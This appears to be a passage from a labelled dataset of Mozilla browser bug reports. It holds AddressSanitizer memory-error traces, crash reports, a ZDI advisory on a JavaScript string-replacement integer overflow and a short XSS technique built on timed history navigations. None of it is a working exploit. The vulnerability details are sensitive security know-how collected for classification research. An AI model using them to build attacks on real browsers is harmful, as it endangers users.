fix heap-use-after-free in nshtmleditrules reproduces on trunk by starting multiple firefox instances 4-5 with the testcase on command line 25662 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in nshtmleditrules editor/libeditor/html/nshtmleditrules.cpp:212 1 in nshtmleditrules editor/libeditor/html/nshtmleditrules.cpp:205 2 in nstexteditrules release editor/libeditor/text/nstexteditrules.cpp:93 3 in nshtmleditrules release editor/libeditor/html/nshtmleditrules.cpp:220 4 in nsrunnablemethodreceiver nshtmleditrules true revoke dist/include/nsthreadutils.h:304 5 in nsrunnablemethodreceiver dist/include/nsthreadutils.h:303 6 in nsrunnablemethodreceiver dist/include/nsthreadutils.h:303 7 in nsrunnablemethodimpl void nshtmleditrules true nsrunnablemethodimpl dist/include/nsthreadutils.h:333 8 in nsrunnablemethodimpl void nshtmleditrules true nsrunnablemethodimpl dist/include/nsthreadutils.h:333 9 in nsrunnablemethodimpl void nshtmleditrules true nsrunnablemethodimpl dist/include/nsthreadutils.h:333 10 in nsrunnable release objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:30 11 in nscomptr_base xpcom/build glue/nscomptr.h:408 12 in nscomptr nsirunnable nscomptr dist/include/nscomptr.h:447 13 in nscomptr nsirunnable nscomptr dist/include/nscomptr.h:447 14 in nstarrayelementtraits nscomptr nsirunnable destruct nscomptr nsirunnable dist/include/nstarray.h:359 15 in nstarray nscomptr nsirunnable nstarraydefaultallocator destructrange unsigned int unsigned int dist/include/nstarray.h:1223 16 in nstarray nscomptr nsirunnable nstarraydefaultallocator removeelementsat unsigned int unsigned int dist/include/nstarray.h:943 17 in nscontentutils removescriptblocker content/base/src/nscontentutils.cpp:5007 18 in nsautoscriptblocker dist/include/nscontentutils.h:2315 19 in nsautoscriptblocker dist/include/nscontentutils.h:2314 20 in nsdocument adoptnode nsidomnode nsidomnode content/base/src/nsdocument.cpp:6410 21 in nsidomdocument_adoptnode jscontext unsigned int js value objdir-ff-asan-sym/js/xpconnect/src/dom_quickstubs.cpp:1453 22 in js calljsnative jscontext int jscontext unsigned int js value js callargs const js/src/jscntxtinlines.h:364 23 in js interpret jscontext js stackframe js interpmode js/src/jsinterp.cpp:2372 24 in js runscript jscontext js handle jsscript js stackframe js/src/jsinterp.cpp:324 25 in js executekernel jscontext js handle jsscript jsobject js value const js executetype js stackframe js value js/src/jsinterp.cpp:510 26 in js execute jscontext js handle jsscript jsobject js value js/src/jsinterp.cpp:547 27 in js evaluate jscontext js handle jsobject js compileoptions unsigned short const unsigned long js value js/src/jsapi.cpp:5702 28 in nsjscontext evaluatestring nsastring_internal const jsobject nsiprincipal nsiprincipal char const unsigned int jsversion nsastring_internal bool dom/base/nsjsenvironment.cpp:1507 29 in nsglobalwindow runtimeouthandler nstimeout nsiscriptcontext dom/base/nsglobalwindow.cpp:9701 30 in nsglobalwindow runtimeout nstimeout dom/base/nsglobalwindow.cpp:9960 31 in nsglobalwindow timercallback nsitimer void dom/base/nsglobalwindow.cpp:10227 32 in nstimerimpl fire xpcom/threads/nstimerimpl.cpp:472 33 in nstimerevent run xpcom/threads/nstimerimpl.cpp:555 34 in nsthread processnextevent bool bool xpcom/threads/nsthread.cpp:612 35 in ns_processnextevent_p nsithread bool objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:220 36 in mozilla ipc messagepump run base messagepump delegate ipc/glue/messagepump.cpp:82 37 in messageloop runinternal ipc/chromium/src/base/message_loop.cc:215 38 in messageloop runhandler ipc/chromium/src/base/message_loop.cc:208 39 in messageloop run ipc/chromium/src/base/message_loop.cc:182 40 in nsbaseappshell run widget/xpwidgets/nsbaseappshell.cpp:163 41 in nsappstartup run toolkit/components/startup/nsappstartup.cpp:290 42 in xremain xre_mainrun toolkit/xre/nsapprunner.cpp:3792 43 in xremain xre_main int char nsxreappdata const toolkit/xre/nsapprunner.cpp:3858 44 in xre_main toolkit/xre/nsapprunner.cpp:3933 45 in do_main int char browser/app/nsbrowserapp.cpp:174 46 in main browser/app/nsbrowserapp.cpp:279 47 in 0 is located 0 bytes inside of 824-byte region freed by thread t0 here 0 in interceptor_free 1 in moz_free memory/mozalloc/mozalloc.cpp:51 2 in operator delete void dist/include/mozilla/mozalloc.h:224 3 in nseditor release editor/libeditor/base/nseditor.cpp:211 4 in nshtmleditor release editor/libeditor/html/nshtmleditor.cpp:203 5 in nscomptr_base dist/include/nscomptr.h:408 6 in nscomptr nsieditor nscomptr dist/include/nscomptr.h:447 7 in nscomptr nsieditor nscomptr dist/include/nscomptr.h:447 8 in nseditorspellcheck editor/composer/src/nseditorspellcheck.cpp:219 9 in nseditorspellcheck editor/composer/src/nseditorspellcheck.cpp:215 10 in nseditorspellcheck release editor/composer/src/nseditorspellcheck.cpp:193 11 in nscomptr_base dist/include/nscomptr.h:408 12 in nscomptr nsieditorspellcheck nscomptr dist/include/nscomptr.h:447 13 in nscomptr nsieditorspellcheck nscomptr dist/include/nscomptr.h:447 14 in mozinlinespellchecker extensions/spellcheck/src/mozinlinespellchecker.cpp:506 15 in mozinlinespellchecker extensions/spellcheck/src/mozinlinespellchecker.cpp:505 16 in mozinlinespellchecker release extensions/spellcheck/src/mozinlinespellchecker.cpp:479 17 in nsrefptr dist/include/nsautoptr.h:874 18 in nsrefptr dist/include/nsautoptr.h:872 19 in mozinlinespellstatus mozinlinespellstatus extensions/spellcheck/src/mozinlinespellchecker.h:33 20 in mozinlinespellstatus mozinlinespellstatus extensions/spellcheck/src/mozinlinespellchecker.h:33 21 in mozinlinespellresume mozinlinespellresume extensions/spellcheck/src/mozinlinespellchecker.cpp:451 22 in mozinlinespellresume mozinlinespellresume extensions/spellcheck/src/mozinlinespellchecker.cpp:451 23 in mozinlinespellresume mozinlinespellresume extensions/spellcheck/src/mozinlinespellchecker.cpp:451 24 in nsrunnable release objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:30 25 in nscomptr_base dist/include/nscomptr.h:408 26 in nscomptr nsirunnable nscomptr dist/include/nscomptr.h:447 27 in nscomptr nsirunnable nscomptr dist/include/nscomptr.h:447 28 in nsthread processnextevent bool bool xpcom/threads/nsthread.cpp:618 29 in ns_processnextevent_p nsithread bool objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:220 previously allocated by thread t0 here 0 in malloc 1 in moz_xmalloc memory/mozalloc/mozalloc.cpp:57 2 in operator new unsigned long dist/include/mozilla/mozalloc.h:200 3 in mozilla genericfactory createinstance nsisupports nsid const void objdir-ff-asan-sym/xpcom/build/genericfactory.cpp:16 4 in nscomponentmanagerimpl createinstancebycontractid char const nsisupports nsid const void xpcom/components/nscomponentmanager.cpp:1006 5 in callcreateinstance char const nsisupports nsid const void objdir-ff-asan-sym/xpcom/build/nscomponentmanagerutils.cpp:135 6 in nscreateinstancebycontractid operator nsid const void const objdir-ff-asan-sym/xpcom/build/nscomponentmanagerutils.cpp:178 7 in nscomptr_base assign_from_helper nscomptr_helper const nsid const objdir-ff-asan-sym/xpcom/build/nscomptr.cpp:110 8 in nscomptr nsieditor operator nscomptr_helper const dist/include/nscomptr.h:689 9 in nseditingsession setupeditoronwindow nsidomwindow editor/composer/src/nseditingsession.cpp:423 10 in nseditingsession makewindoweditable nsidomwindow char const bool bool bool editor/composer/src/nseditingsession.cpp:173 11 in nshtmldocument editingstatechanged content/html/document/src/nshtmldocument.cpp:2658 12 in nshtmldocument maybeeditingstatechanged content/html/document/src/nshtmldocument.cpp:2304 13 in nshtmldocument endupdate unsigned int content/html/document/src/nshtmldocument.cpp:2317 14 in nshtml5treeopexecutor enddocupdate parser/html/nshtml5treeopexecutor.h:248 15 in nshtml5treeopexecutor didbuildmodel bool parser/html/nshtml5treeopexecutor.cpp:131 16 in nshtml5treeoperation perform nshtml5treeopexecutor nsicontent parser/html/nshtml5treeoperation.cpp:639 17 in nshtml5treeopexecutor runflushloop parser/html/nshtml5treeopexecutor.cpp:564 18 in nshtml5executorflusher run parser/html/nshtml5streamparser.cpp:127 19 in nsthread processnextevent bool bool xpcom/threads/nsthread.cpp:612 20 in ns_processnextevent_p nsithread bool objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:220 21 in mozilla ipc messagepump run base messagepump delegate ipc/glue/messagepump.cpp:82 22 in messageloop runinternal ipc/chromium/src/base/message_loop.cc:215 23 in messageloop runhandler ipc/chromium/src/base/message_loop.cc:208 24 in messageloop run ipc/chromium/src/base/message_loop.cc:182 25 in nsbaseappshell run widget/xpwidgets/nsbaseappshell.cpp:163 26 in nsappstartup run toolkit/components/startup/nsappstartup.cpp:290 27 in xremain xre_mainrun toolkit/xre/nsapprunner.cpp:3792 28 in xremain xre_main int char nsxreappdata const toolkit/xre/nsapprunner.cpp:3858 29 in xre_main toolkit/xre/nsapprunner.cpp:3933 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd stats 271m malloced 1203m for red zones by 552799 calls stats 45m realloced by 28360 calls stats 233m freed by 308733 calls stats 155m really freed by 234701 calls stats 960m 245847 full pages mmaped in 240 calls mmaps by size class 11:313191 12:4096 13:1536 14:1280 15:256 16:832 17:1216 18:176 19:40 20:24 mallocs by size class 11:539587 12:5764 13:2495 14:1669 15:381 16:1295 17:1349 18:196 19:41 20:22 frees by size class 11:298141 12:3893 13:2206 14:1451 15:324 16:1189 17:1331 18:141 19:38 20:19 rfrees by size class 11:227507 12:2307 13:1313 14:1203 15:223 16:990 17:1125 18:28 19:4 20:1 stats malloc large 1608 small slow 9746 25662 aborting	11
xss using timed document navigations it is possible to load an arbitrary website with the document s baseuri pointing to a malicious server which allows script injection or data theft when the page accesses a relative path the exploit performs several navigations to achieve a stable result it seems to me that the crucial part is the following sequence opener.history.go 0 opener.history.forward opener.location.hash a in certain circumstances the late hash navigation appears to confuse the browser to adopt the same bfcache and/or share a history entry between the 2 adjacent cross-origin pages	9
crash nssockssocketinfo connecttoproxy prfiledesc clicking download the rest of the message tbird 16.0.1 reliable crash upon clicking download the rest of this message crash ids bp-db07a65e-15a7-4b58-bada-b01502121022 bp-a06c34e6-c260-449a-8721-4723c2121022 bp-822a5bd5-ce6d-4c57-8bf0-944732121022	11
heap-buffer-overflow in gfxshapedword compressedglyph isclusterstart reproduces on trunk 18316 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 4 at thread t0 0 in gfxshapedword compressedglyph isclusterstart const dist/include/gfxfont.h:1920 1 in gfxtextrun isclusterstart unsigned int dist/include/gfxfont.h:2383 2 in countcharsfit gfxtextrun unsigned int unsigned int double propertyprovider double layout/generic/nstextframethebes.cpp:6128 3 in nstextframe getcharacteroffsetatframepointinternal nspoint const bool layout/generic/nstextframethebes.cpp:6171 4 in nstextframe calccontentoffsetsfromframepoint nspoint layout/generic/nstextframethebes.cpp:6144 5 in nsiframe getcontentoffsetsfrompoint nspoint unsigned int layout/generic/nsframe.cpp:3643 6 in nsframe handlepress nsprescontext nsguievent nseventstatus layout/generic/nsframe.cpp:2714 7 in nsframe handleevent nsprescontext nsguievent nseventstatus layout/generic/nsframe.cpp:2401 8 in nspresshelleventcb handleevent nseventchainpostvisitor layout/base/nspresshell.cpp:492 9 in nseventtargetchainitem handleeventtargetchain nseventchainpostvisitor unsigned int nsdispatchingcallback bool nscxpusher content/events/src/nseventdispatcher.cpp:362 10 in nseventdispatcher dispatch nsisupports nsprescontext nsevent nsidomevent nseventstatus nsdispatchingcallback nscomarray nsidomeventtarget content/events/src/nseventdispatcher.cpp:629 11 in presshell handleeventinternal nsevent nseventstatus layout/base/nspresshell.cpp:6474 12 in presshell handlepositionedevent nsiframe nsguievent nseventstatus layout/base/nspresshell.cpp:6223 13 in presshell handleevent nsiframe nsguievent bool nseventstatus layout/base/nspresshell.cpp:6022 14 in nsviewmanager dispatchevent nsguievent nsiview nseventstatus view/src/nsviewmanager.cpp:771 15 in nsview handleevent nsguievent bool view/src/nsview.cpp:1068 16 in non-virtual thunk to nsview handleevent nsguievent bool 17 in nswindow dispatchevent nsguievent nseventstatus widget/gtk2/nswindow.cpp:458 18 in nswindow onbuttonpressevent gtkwidget gdkeventbutton widget/gtk2/nswindow.cpp:2729 19 in button_press_event_cb gtkwidget gdkeventbutton widget/gtk2/nswindow.cpp:5256 20 in 0 is located 0 bytes to the right of 136-byte region allocated by thread t0 here 0 in malloc 1 in moz_malloc memory/mozalloc/mozalloc.cpp:64 2 in gfxtextrun allocatestoragefortextrun unsigned long unsigned int gfx/thebes/gfxfont.cpp:4469 3 in gfxtextrun create gfxtextrunfactory parameters const unsigned int gfxfontgroup unsigned int gfx/thebes/gfxfont.cpp:4486 4 in gfxfontgroup maketextrun unsigned char const unsigned int gfxtextrunfactory parameters const unsigned int gfx/thebes/gfxfont.cpp:3531 5 in gfxtextrun maketextrun unsigned char unsigned char const unsigned int gfxfontgroup gfxtextrunfactory parameters const unsigned int layout/generic/nstextframethebes.cpp:552 6 in buildtextrunsscanner buildtextrunforframes void layout/generic/nstextframethebes.cpp:2049 7 in buildtextrunsscanner flushframes bool bool layout/generic/nstextframethebes.cpp:1408 8 in buildtextruns gfxcontext nstextframe nsiframe nslinelist_iterator const nstextframe textruntype layout/generic/nstextframethebes.cpp:1336 shadow byte and word fb 00 fb fb fb fb fb fb fb more shadow bytes fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd stats 268m malloced 261m for red zones by 537106 calls stats 44m realloced by 25642 calls stats 237m freed by 307654 calls stats 204m really freed by 253059 calls stats 265m 67958 full pages mmaped in 507 calls mmaps by size class 7:221130 8:47081 9:13299 10:6643 11:7650 12:1664 13:896 14:544 15:144 16:680 17:452 18:134 19:35 20:21 mallocs by size class 7:380809 8:92863 9:25780 10:10928 11:16758 12:3095 13:1929 14:1723 15:343 16:1260 17:1370 18:183 19:42 20:23 frees by size class 7:193336 8:64604 9:19790 10:7821 11:13658 12:2141 13:1717 14:1555 15:289 16:1173 17:1353 18:158 19:39 20:20 rfrees by size class 7:163685 8:49891 9:15630 10:4663 11:12235 12:1530 13:1333 14:1345 15:244 16:1098 17:1289 18:61 19:37 20:18 stats malloc large 3221 small slow 5781 18316 aborting	11
crash when xml binding xbl includes another binding which contains svg user agent mozilla/5.0 windows nt 6.1 rv:16.0 gecko/20100101 firefox/16.0 build id 20121010144125 steps to reproduce the xbl file contains two xml bindings pie_chart and pie_chart_segment both contain svg when you insert pie_chart_segment into pie_chart with the help of the children xbl tag firefox crashes reproducible always how to reporoduce 1 install remote xul manager addon so you can open local xul files 2 add a file record in remote xul manager s allowed url list 3 unpack ff_xbl_svg_crash.zip 4 open test.xul firefox will crash	11
string replacement heap corruption remote code execution vulnerability zdi-can-1473 zdi-can-1473 mozilla firefox string replacement heap corruption remote code execution vulnerability cvss 7.5 av n/ac l/au n/c p/i p/a p abstract tippingpoint has identified a vulnerability affecting the following products mozilla firefox vulnerability details an integer overflow is possible when calculating the length for a javascript string concatenation mozilla-release\js\src\jsstr.cpp findreplacelength jscontext cx regexpstatics res replacedata rdata size_t sizep jsstring repstr rdata.repstr size_t replen repstr length for const jschar dp rdata.dollar ep rdata.dollarend dp dp js_strchr_limit dp ep jssubstring sub size_t skip if interpretdollar cx res dp ep rdata sub skip replen sub.length skip dp skip else dp sizep replen return true the for loop above illustrates the problem the looped arithmetic operation to add to replen can result in replen wrapping the code below shows the use of the above function in a vulnerable fashion replaceregexpcallback jscontext cx regexpstatics res size_t count void p size_t replen 0 silence unused warning if findreplacelength cx res rdata replen return false size_t growth leftlen replen if rdata.sb.reserve rdata.sb.length growth return false rdata.sb.infallibleappend left leftlen skipped-over portion of the search value doreplace cx res rdata the call to findreplacelength can result in a wrapped replen value which when used for allocation causes an undersized allocation use of the undersized allocation results in memory corruption credit this vulnerability was discovered by pa_kt twitter.com/pa_kt	11
heap-use-after-free in nstexteditorstate prepareeditor reproduces on trunk 20748 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in nscomptr nsieditor operator nscomptr nsieditor const dist/include/nscomptr.h:614 1 in nstexteditorstate prepareeditor nsastring_internal const content/html/content/src/nstexteditorstate.cpp:1210 2 in prepareeditorevent run content/html/content/src/nstexteditorstate.cpp:1029 3 in nscontentutils removescriptblocker content/base/src/nscontentutils.cpp:5015 4 in nsautoscriptblocker dist/include/nscontentutils.h:2332 5 in nsautoscriptblocker dist/include/nscontentutils.h:2331 6 in presshell flushpendingnotifications mozflushtype layout/base/nspresshell.cpp:3857 7 in nshideviewer run layout/generic/nssubdocumentframe.cpp:775 8 in nscontentutils removescriptblocker content/base/src/nscontentutils.cpp:5015 9 in nsautoscriptblocker dist/include/nscontentutils.h:2332 10 in nsautoscriptblocker dist/include/nscontentutils.h:2331 11 in nsdocument adoptnode nsidomnode nsidomnode content/base/src/nsdocument.cpp:5957 12 in nsidomdocument_adoptnode jscontext unsigned int js value objdir-ff-asan-sym/js/xpconnect/src/dom_quickstubs.cpp:1391 13 in js calljsnative jscontext int jscontext unsigned int js value js callargs const js/src/jscntxtinlines.h:364 14 in js interpret jscontext js stackframe js interpmode js/src/jsinterp.cpp:2369 15 in js runscript jscontext js handle jsscript js stackframe js/src/jsinterp.cpp:324 16 in js executekernel jscontext js handle jsscript jsobject js value const js executetype js stackframe js value js/src/jsinterp.cpp:510 17 in js execute jscontext js handle jsscript jsobject js value js/src/jsinterp.cpp:547 18 in js evaluate jscontext js handle jsobject js compileoptions unsigned short const unsigned long js value js/src/jsapi.cpp:5703 19 in nsjscontext evaluatestring nsastring_internal const jsobject nsiprincipal nsiprincipal char const unsigned int jsversion nsastring_internal bool dom/base/nsjsenvironment.cpp:1499 20 in nsglobalwindow runtimeouthandler nstimeout nsiscriptcontext dom/base/nsglobalwindow.cpp:9740 21 in nsglobalwindow runtimeout nstimeout dom/base/nsglobalwindow.cpp:9999 22 in nsglobalwindow timercallback nsitimer void dom/base/nsglobalwindow.cpp:10266 23 in nstimerimpl fire xpcom/threads/nstimerimpl.cpp:472 24 in nstimerevent run xpcom/threads/nstimerimpl.cpp:555 25 in nsthread processnextevent bool bool xpcom/threads/nsthread.cpp:620 26 in ns_processnextevent_p nsithread bool objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:220 27 in mozilla ipc messagepump run base messagepump delegate ipc/glue/messagepump.cpp:82 28 in messageloop runinternal ipc/chromium/src/base/message_loop.cc:215 29 in messageloop runhandler ipc/chromium/src/base/message_loop.cc:208 30 in messageloop run ipc/chromium/src/base/message_loop.cc:182 31 in nsbaseappshell run widget/xpwidgets/nsbaseappshell.cpp:163 32 in nsappstartup run toolkit/components/startup/nsappstartup.cpp:290 33 in xremain xre_mainrun toolkit/xre/nsapprunner.cpp:3799 34 in xremain xre_main int char nsxreappdata const toolkit/xre/nsapprunner.cpp:3866 35 in xre_main toolkit/xre/nsapprunner.cpp:3941 36 in do_main int char browser/app/nsbrowserapp.cpp:174 37 in main browser/app/nsbrowserapp.cpp:279 38 in 0 is located 32 bytes inside of 128-byte region freed by thread t0 here 0 in interceptor_free 1 in moz_free memory/mozalloc/mozalloc.cpp:48 2 in operator delete void dist/include/mozilla/mozalloc.h:224 3 in nshtmlinputelement handletypechange unsigned char content/html/content/src/nshtmlinputelement.cpp:2628 4 in nshtmlinputelement parseattribute int nsiatom nsastring_internal const nsattrvalue content/html/content/src/nshtmlinputelement.cpp:2758 5 in nsgenericelement setattr int nsiatom nsiatom nsastring_internal const bool content/base/src/nsgenericelement.cpp:1954 6 in nsgenerichtmlelement setattr int nsiatom nsiatom nsastring_internal const bool content/html/content/src/nsgenerichtmlelement.cpp:2002 7 in nsgenerichtmlelement setattr int nsiatom nsastring_internal const bool content/html/document/src content/src/nsgenerichtmlelement.h:245 8 in nsgenerichtmlelement setattrhelper nsiatom nsastring_internal const content/html/content/src/nsgenerichtmlelement.cpp:2871 9 in nshtmlinputelement settype nsastring_internal const content/html/content/src/nshtmlinputelement.cpp:905 10 in non-virtual thunk to nshtmlinputelement settype nsastring_internal const 11 in nsidomhtmlinputelement_settype jscontext js handle jsobject js handle long int js mutablehandle js value objdir-ff-asan-sym/js/xpconnect/src/dom_quickstubs.cpp:13483 12 in js calljspropertyopsetter jscontext int jscontext js handle jsobject js handle long int js mutablehandle js value js handle jsobject js handle long int js mutablehandle js value js/src/jscntxtinlines.h:450 13 in js baseops setpropertyhelper jscontext js handle jsobject js handle jsobject js handle long unsigned int js mutablehandle js value int js/src/jsobj.cpp:4613 14 in js setpropertyoperation jscontext unsigned char js handle js value js handle js value js/src/jsinterpinlines.h:362 previously allocated by thread t0 here 0 in malloc 1 in moz_xmalloc memory/mozalloc/mozalloc.cpp:54 2 in operator new unsigned long dist/include/mozilla/mozalloc.h:200 3 in ns_newhtmlinputelement already_addrefed nsinodeinfo mozilla dom fromparser content/html/content/src/nshtmlinputelement.cpp:538 4 in createhtmlelement unsigned int already_addrefed nsinodeinfo mozilla dom fromparser content/html/document/src/nshtmlcontentsink.cpp:497 5 in ns_newhtmlelement nsicontent already_addrefed nsinodeinfo mozilla dom fromparser content/html/document/src/nshtmlcontentsink.cpp:480 6 in ns_newelement nsicontent already_addrefed nsinodeinfo mozilla dom fromparser content/base/src/nsnamespacemanager.cpp:201 7 in nshtml5treeoperation perform nshtml5treeopexecutor nsicontent parser/html/nshtml5treeoperation.cpp:345 8 in nshtml5treeopexecutor runflushloop parser/html/nshtml5treeopexecutor.cpp:564 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 stats 239m malloced 227m for red zones by 420825 calls stats 43m realloced by 17471 calls stats 201m freed by 199819 calls stats 163m really freed by 165412 calls stats 248m 63708 full pages mmaped in 474 calls mmaps by size class 7:200655 8:45034 9:12276 10:4599 11:8670 12:1152 13:704 14:544 15:144 16:616 17:452 18:112 19:35 20:21 mallocs by size class 7:289609 8:78837 9:21511 10:7139 11:15529 12:2157 13:1652 14:1478 15:316 16:1063 17:1326 18:146 19:40 20:22 frees by size class 7:111546 8:49507 9:15454 10:4185 11:12566 12:1338 13:1217 14:1311 15:263 16:1015 17:1310 18:51 19:37 20:19 rfrees by size class 7:94468 8:41302 9:9580 10:2979 11:11409 12:1056 13:983 14:1225 15:217 16:860 17:1278 18:49 19:5 20:1 stats malloc large 2913 small slow 4736 20748 aborting	11
filtering wrapper should filter setters when returning a property descriptor filing this so that i have a bug number for the mochitest i m about to write i ll fill in the details once i m sure this is a problem	9
fix xbl.__proto__.tostring is ugly and reveals address space layout got object chrome xbl-marquee/content/xbl-marquee.xml marquee a646314 expected in opt do n't reveal address space info object chrome xbl-marquee/content/xbl-marquee.xml marquee expected in debug format it properly object chrome xbl-marquee/content/xbl-marquee.xml marquee i ca n't find the code that s doing this but here s an example of code doing it right 74	11
have securitywrapper deny access for various sketchy sm extensions it looks like there was originally an intention to do this for things like nativecall and objectclassis but it was thwarted by document.domain we can do it now though once bug 800915 lands and it ll be good defense-in-depth	2
out of bounds read in nssvgpathelement getpathlengthscale reproduces on trunk 17302 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 1 at thread t0 0 in nssvgnumber2 isexplicitlyset const src/content/svg/content/src/nssvgnumber2.h:49 1 in nssvgpathelement getpathlengthscale nssvgpathelement pathlengthscalefortype src/content/svg/content/src/nssvgpathelement.cpp:404 2 in nssvgtextpathframe getoffsetscale src/layout/svg/nssvgtextpathframe.cpp:146 3 in nssvgglyphframe setglyphposition gfxpoint bool src/layout/svg/nssvgglyphframe.cpp:1329 4 in nssvgtextframe updateglyphpositioning bool src/layout/svg/nssvgtextframe.cpp:474 5 in nssvgtextframe reflowsvg src/layout/svg/nssvgtextframe.cpp:247 6 in non-virtual thunk to nssvgtextframe reflowsvg src/layout/svg/nssvgtextframe.cpp:253 7 in nssvgdisplaycontainerframe reflowsvg src/layout/svg/nssvgcontainerframe.cpp:271 8 in nssvgoutersvgframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/svg/nssvgoutersvgframe.cpp:450 9 in nslinelayout reflowframe nsiframe unsigned int nshtmlreflowmetrics bool src/layout/generic/nslinelayout.cpp:842 10 in nsinlineframe reflowinlineframe nsprescontext nshtmlreflowstate const nsinlineframe inlinereflowstate nsiframe unsigned int src/layout/generic/nsinlineframe.cpp:694 11 in nsinlineframe reflowframes nsprescontext nshtmlreflowstate const nsinlineframe inlinereflowstate nshtmlreflowmetrics unsigned int src/layout/generic/nsinlineframe.cpp:557 12 in nsinlineframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsinlineframe.cpp:409 13 in nslinelayout reflowframe nsiframe unsigned int nshtmlreflowmetrics bool src/layout/generic/nslinelayout.cpp:842 14 in nsblockframe reflowinlineframe nsblockreflowstate nslinelayout nslinelist_iterator nsiframe linereflowstatus src/layout/generic/nsblockframe.cpp:3721 15 in nsblockframe doreflowinlineframes nsblockreflowstate nslinelayout nslinelist_iterator nsflowarearect int nsfloatmanager savedstate bool linereflowstatus bool src/layout/generic/nsblockframe.cpp:3518 16 in nsblockframe reflowinlineframes nsblockreflowstate nslinelist_iterator bool src/layout/generic/nsblockframe.cpp:3372 17 in nsblockframe reflowline nsblockreflowstate nslinelist_iterator bool src/layout/generic/nsblockframe.cpp:2479 18 in nsblockframe reflowdirtylines nsblockreflowstate src/layout/generic/nsblockframe.cpp:1996 19 in nsblockframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsblockframe.cpp:1041 20 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker src/layout/generic/nscontainerframe.cpp:952 21 in nscanvasframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nscanvasframe.cpp:464 22 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker src/layout/generic/nscontainerframe.cpp:952 23 in nshtmlscrollframe reflowscrolledframe scrollreflowstate bool bool nshtmlreflowmetrics bool src/layout/generic/nsgfxscrollframe.cpp:433 24 in nshtmlscrollframe reflowcontents scrollreflowstate nshtmlreflowmetrics const src/layout/generic/nsgfxscrollframe.cpp:533 25 in nshtmlscrollframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsgfxscrollframe.cpp:774 26 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker src/layout/generic/nscontainerframe.cpp:952 27 in viewportframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsviewportframe.cpp:202 28 in presshell doreflow nsiframe bool src/layout/base/nspresshell.cpp:7532 29 in presshell processreflowcommands bool src/layout/base/nspresshell.cpp:7673 30 in presshell flushpendingnotifications mozflushtype src/layout/base/nspresshell.cpp:3913 31 in nsrefreshdriver notify nsitimer src/layout/base/nsrefreshdriver.cpp:403 32 in nstimerimpl fire src/xpcom/threads/nstimerimpl.cpp:485 33 in nstimerevent run src/xpcom/threads/nstimerimpl.cpp:565 34 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:627 35 in ns_processnextevent_p nsithread bool src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:221 36 in mozilla ipc messagepump run base messagepump delegate src/ipc/glue/messagepump.cpp:82 37 in messageloop runinternal src/ipc/chromium/src/base/message_loop.cc:215 38 in messageloop runhandler src/ipc/chromium/src/base/message_loop.cc:208 39 in messageloop run src/ipc/chromium/src/base/message_loop.cc:182 40 in nsbaseappshell run src/widget/xpwidgets/nsbaseappshell.cpp:163 41 in nsappstartup run src/toolkit/components/startup/nsappstartup.cpp:290 42 in xremain xre_mainrun src/toolkit/xre/nsapprunner.cpp:3822 43 in xremain xre_main int char nsxreappdata const src/toolkit/xre/nsapprunner.cpp:3889 44 in xre_main src/toolkit/xre/nsapprunner.cpp:4083 45 in do_main int char src/browser/app/nsbrowserapp.cpp:174 46 in main src/browser/app/nsbrowserapp.cpp:279 47 in 0 is located 9 bytes to the right of 264-byte region allocated by thread t0 here 0 in malloc 1 in moz_xmalloc src/memory/mozalloc/mozalloc.cpp:54 2 in operator new unsigned long src dist/include/mozilla/mozalloc.h:200 3 in ns_newsvgelement nsicontent already_addrefed nsinodeinfo mozilla dom fromparser src/content/svg/content/src/nssvgelementfactory.cpp:232 4 in ns_newelement nsicontent already_addrefed nsinodeinfo mozilla dom fromparser src/content/base/src/nsnamespacemanager.cpp:212 5 in nsxmlcontentsink createelement unsigned short const unsigned int nsinodeinfo unsigned int nsicontent bool mozilla dom fromparser src/content/xml/document/src/nsxmlcontentsink.cpp:467 6 in nsxmlcontentsink handlestartelement unsigned short const unsigned short const unsigned int int unsigned int bool src/content/xml/document/src/nsxmlcontentsink.cpp:997 7 in nsxmlcontentsink handlestartelement unsigned short const unsigned short const unsigned int int unsigned int 